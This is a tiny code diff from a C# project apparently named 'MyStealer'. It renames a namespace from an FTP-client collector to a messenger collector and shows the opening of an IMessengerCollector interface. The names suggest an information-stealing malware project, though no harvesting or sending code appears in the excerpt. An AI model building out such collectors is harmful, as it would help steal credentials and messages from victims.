@@ -1,6 +1,6 @@
 ﻿using System.Collections.Immutable;
 
-namespace MyStealer.Collectors.FtpClient
+namespace MyStealer.Collectors.Messenger
 {
     internal interface IMessengerCollector
     {
